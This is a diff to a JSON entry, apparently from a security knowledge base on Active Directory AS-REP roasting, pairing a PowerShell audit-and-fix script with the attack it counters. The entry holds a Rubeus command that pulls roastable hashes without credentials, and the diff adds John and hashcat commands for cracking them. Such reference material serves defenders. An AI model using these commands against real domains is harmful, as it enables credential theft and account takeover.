@@ -106,5 +106,15 @@
     "misconfiguration": "Accounts created with 'Do not require Kerberos preauthentication' checked — often legacy service accounts or misconfigured automation accounts. No periodic audit for this attribute.",
     "vulnerable_config": "# Accounts vulnerable to AS-REP roasting:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth\n# Output: svc_legacy — DoesNotRequirePreAuth: True → VULNERABLE\n\n# Can be exploited without any credentials:\n# Rubeus.exe asreproast /user:svc_legacy /format:hashcat /outfile:asrep.txt\n# → $krb5asrep$23$svc_legacy@CORP.LOCAL:... (crack with hashcat -m 18200)",
     "secure_config": "# Audit and fix all pre-auth disabled accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {\n  Set-ADAccountControl $_ -DoesNotRequirePreAuth $false\n  Write-Output \"Fixed: $($_.SamAccountName)\"\n}\n\n# Scheduled task / quarterly audit:\n$vuln = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\nif ($vuln) { Send-MailMessage -To 'security@corp.local' -Subject 'AS-REP Roastable Accounts Found' -Body ($vuln | Out-String) }\n\n# MDI: 'AS-REP roasting attack' alert enabled by default on MDI deployment"
-  }
+  },
+  "variations": [
+    {
+      "label": "Crack AS-REP hashes (John)",
+      "command": "john.exe --wordlist=<wordlist> <hashfile>"
+    },
+    {
+      "label": "Crack AS-REP (hashcat m18200)",
+      "command": "hashcat -m 18200 <hashfile> <wordlist>"
+    }
+  ]
 }
